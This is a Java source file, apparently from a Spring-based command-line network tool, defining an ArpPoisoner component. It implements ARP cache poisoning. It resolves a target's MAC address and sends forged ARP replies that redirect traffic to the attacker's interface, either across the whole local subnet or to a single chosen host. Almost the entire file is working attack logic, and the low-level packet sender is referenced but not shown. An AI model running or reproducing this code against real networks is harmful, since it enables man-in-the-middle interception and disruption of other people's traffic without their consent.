package io.gl4dius.cli.module.arp;

import io.gl4dius.cli.exception.NeighborMacResolutionException;
import io.gl4dius.cli.service.NetDiscoveryService;
import io.gl4dius.cli.utility.NetInterfaceUtil;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Component;

@Slf4j
@Component
@RequiredArgsConstructor
public class ArpPoisoner {

    private final ArpSender arpSender;
    private final NetDiscoveryService netDiscoveryService;

    /**
     * Performs an ARP cache poisoning attack with behavior determined by which a combination
     * of {@code spoofIp} and {@code targetIp} are provided:
     *
     * <ul>
     *   <li><b>Only {@code spoofIp}</b> — poisons all hosts in the local subnet, advertising
     *       {@code spoofIp} as reachable via this interface's MAC address.</li>
     *   <li><b>Only {@code targetIp}</b> — poisons a single target host with all subnet IPs,
     *       causing it to associate every subnet host address with this interface's MAC address.</li>
     *   <li><b>Both</b> — sends a single targeted ARP reply to {@code targetIp}, advertising
     *       {@code spoofIp} as reachable via this interface's MAC address.</li>
     * </ul>
     * <p>
     * If {@code targetMac} is not provided but {@code targetIp} is, MAC address resolution
     * is attempted automatically via neighbor discovery. If resolution fails, the operation
     * is aborted with a {@link NeighborMacResolutionException}.
     *
     * @param nicName   the name of the network interface to use (e.g. {@code "eth0"})
     * @param spoofIp   the IP address to impersonate in ARP replies; may be {@code null}
     *                  if {@code targetIp} is provided
     * @param targetIp  the IP address of the specific host to poison; may be {@code null}
     *                  if {@code spoofIp} is provided
     * @param targetMac the MAC address of the target host; may be {@code null} when
     *                  {@code targetIp} is set, in which case it is resolved automatically
     * @throws IllegalArgumentException if both {@code spoofIp} and {@code targetIp} are {@code null}
     */
    public void poison(String nicName, String spoofIp, String targetIp, String targetMac) {
        if (spoofIp == null && targetIp == null) {
            throw new IllegalArgumentException("You need to specify either spoofIp or targetIp");
        }

        try {
            if (targetIp != null && targetMac == null) {
                targetMac = this.netDiscoveryService.resolveNeighborMacAddress(nicName, targetIp)
                        .orElseThrow(() -> new NeighborMacResolutionException("Automatic NetDiscovery couldn't find target MAC address, you need to insert it manually"));
                log.debug("NetDiscovery Resolved target MAC address: {} for IP {}", targetMac, targetIp);
            }

            var nic = NetInterfaceUtil.findInterface(nicName);
            var interfaceMac = NetInterfaceUtil.resolveMac(nic);
            if (targetIp == null) {
                var ipv4Subnet = NetInterfaceUtil.resolveIpv4Subnet(nicName);
                this.arpSender.sendBulkArpReply(nicName, spoofIp, interfaceMac.toString(), ipv4Subnet);
            } else if (spoofIp == null) {
                var ipv4Subnet = NetInterfaceUtil.resolveIpv4Subnet(nicName);
                this.arpSender.sendBulkArpReply(nicName, ipv4Subnet, interfaceMac.toString(), targetIp, targetMac);
            } else {
                this.arpSender.sendArpReply(nicName, spoofIp, interfaceMac.toString(), targetIp, targetMac);
            }
        } catch (Exception e) {
            log.error("Failed to poison ARP", e);
        }
    }
}
